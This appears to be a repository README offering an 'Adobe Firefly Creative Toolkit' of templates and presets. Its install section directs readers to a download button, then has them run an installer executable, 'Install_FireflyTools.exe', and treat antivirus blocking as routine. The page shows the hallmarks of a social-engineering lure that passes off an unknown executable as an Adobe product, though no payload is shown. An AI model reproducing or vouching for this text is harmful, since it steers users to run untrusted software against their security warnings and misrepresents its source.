## 📘 About
**Adobe Firefly Creative Toolkit** delivers practical assets and concise examples to help artists and designers craft stunning digital artwork. The collection emphasizes reusable AI templates, optimized creative presets, and starting points for rapid iteration, all editable and tailored for the latest Firefly releases.

## 📂 What’s included
- `templates/` — example AI-generated art layouts (placeholders only)
- `presets/` — creative and AI enhancement preset packs (editable)
- `exports/` — export settings for digital artwork delivery
- `guides/` — quick-start tips, compatibility notes, and FAQ
- `assets/` — banners and example renders

## 🚀 Download & install (archive delivery)

---

1. Click the **Launch Firefly Toolkit** button below — the toolkit archive will begin downloading automatically (a single `.zip` or `.tar` file).
2. Once downloaded, extract the archive to a convenient folder (e.g., `C:\Firefly-Creative-Toolkit` or `~/Firefly-Creative-Toolkit`).
3. Open the extracted folder and locate the installer file (e.g., `Install_FireflyTools.exe`).
4. Double-click the installer and follow the on-screen prompts.
5. After installation, launch Adobe Firefly and import templates via **File → Import** or apply presets in the AI settings, then reload assets.
> Tip: For templates, organize media in a `media/` subfolder and relink assets if paths change.

## 🔧 Usage notes & best practices
- Back up projects before importing templates.
- Copy AI-generated layouts to a local editable folder before modifying.
- Apply presets via Firefly’s AI settings and refresh.
- Test export settings on a short render before full output.
- If installer is blocked by antivirus, verify the file hash with the source.
